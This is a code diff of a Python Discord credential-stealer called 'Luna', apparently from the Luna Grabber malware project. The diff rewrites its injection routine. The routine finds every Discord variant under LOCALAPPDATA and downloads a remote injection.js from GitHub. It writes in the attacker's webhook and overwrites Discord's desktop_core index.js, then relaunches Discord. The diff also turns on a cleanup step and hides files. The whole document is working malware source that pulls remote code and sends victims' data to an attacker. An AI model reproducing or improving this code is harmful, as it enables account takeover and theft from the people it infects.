@@ -1,6 +1,6 @@
 import os
 import platform
-import difflib
+import re
 import threading
 import uuid
 import requests
@@ -75,7 +75,7 @@ def Luna():
     debug()
     main(webhook)
     inject(webhook)
-    # cleanup()
+    cleanup()
 
 def try_extract(func):
         def wrapper(*args, **kwargs):
@@ -535,18 +535,50 @@ def cleanup():
 def hide(file):
     SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)
 
-def inject(webhook):
-    appdata = os.getenv("localappdata")
-    for _dir in os.listdir(appdata):
-        if 'discord' in _dir.lower():
-            for __dir in os.listdir(os.path.abspath(appdata+os.sep+_dir)):
-                if match(r'app-(\d*\.\d*)*', __dir):
-                    abspath = os.path.abspath(appdata+os.sep+_dir+os.sep+__dir) 
-                    f = requests.get("https://raw.githubusercontent.com/Smug246/Luna-Grabber-Builder/main/injection.js").text.replace("%WEBHOOK%", webhook)
-                    modules_dir = os.listdir(abspath+'\\modules') 
-                    with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
-                        indexFile.write(f)
-                    subprocess.call(["start", abspath+os.sep+"Discord.exe"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+class inject:
+    def __init__(self, webhook: str):
+        self.appdata = os.getenv('LOCALAPPDATA')
+        self.discord_dirs = [
+            self.appdata + '\\Discord', 
+            self.appdata + '\\DiscordCanary', 
+            self.appdata + '\\DiscordPTB', 
+            self.appdata + '\\DiscordDevelopment'
+        ]
+        self.code = requests.get("https://raw.githubusercontent.com/Smug246/Luna-Grabber-Builder/main/injection.js").text
+            
+        for dir in self.discord_dirs:
+            if not os.path.exists(dir): continue    
+            
+            if self.get_core(dir) is not None:
+                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
+                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
+                    self.start_discord(dir)
+            
+    def get_core(self, dir: str):
+        for file in os.listdir(dir):
+            if re.search(r'app-+?', file):
+                modules = dir + '\\' + file + '\\modules'
+                if not os.path.exists(modules): continue
+                for file in os.listdir(modules):
+                    if re.search(r'discord_desktop_core-+?', file):
+                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
+                        if not os.path.exists(core + '\\index.js'): 
+                            continue
+                        
+                        return core, file
+                    
+    def start_discord(self, dir: str):
+        update = dir + '\\Update.exe'
+        executable = dir.split('\\')[-1] + '.exe'
+        
+        for file in os.listdir(dir):
+            if re.search(r'app-+?', file):
+                app = dir + '\\' + file
+                if os.path.exists(app + '\\' + 'modules'):
+                    for file in os.listdir(app):
+                        if file == executable:
+                            executable = app + '\\' + executable
+                            subprocess.call([update, '--processStart', executable], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 class debug:
     def __init__(self):
@@ -617,11 +649,4 @@ class debug:
         exit()
 
 if __name__ == '__main__' and os.name == "nt":
-    try:
-        debug()
-        Luna()
-    except Exception:
-        try:
-            cleanup()
-        except Exception:
-            exit()
+    Luna()
